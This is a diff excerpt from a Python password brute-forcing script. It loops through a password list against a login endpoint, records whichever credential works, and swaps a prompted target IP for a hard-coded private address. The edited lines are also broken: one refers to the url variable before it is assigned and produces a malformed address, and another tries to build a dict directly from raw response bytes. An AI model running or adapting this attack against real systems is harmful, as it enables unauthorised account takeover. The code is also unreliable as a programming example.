@@ -16,18 +16,16 @@ def save_pass_buffer():
 # ================== start the requests ========================= 
 # ===============================================================
 
-# url = "http://127.0.0.1:8080/login/"
+url = "http://192.168.29.42:8080/login/"
 headers = {
   'Content-Type': 'application/x-www-form-urlencoded',
   
 }
 
 def send_login_request(*, email: str):
-    target_ip = input("enter target IP address: ")
-    hostname = socket.gethostname()
-    this_ip_add = socket.gethostbyname(hostname)
+    # url = input("enter target IP address: ")
     
-    url = f"http://{target_ip}:8080/login/"
+    url = f"http://{url}:8080/login/"
     
     for password_buffer in passwords:
         password = password_buffer.strip()
@@ -40,7 +38,7 @@ def send_login_request(*, email: str):
             rich_log(email, password, ok=True)
             break
         elif response.status_code == 403:
-            forbidden_log(ip=this_ip_add)
+            forbidden_log(ip=dict(response.content).get("ip"))
             break
         else:
             rich_log(email, password, ok=False)
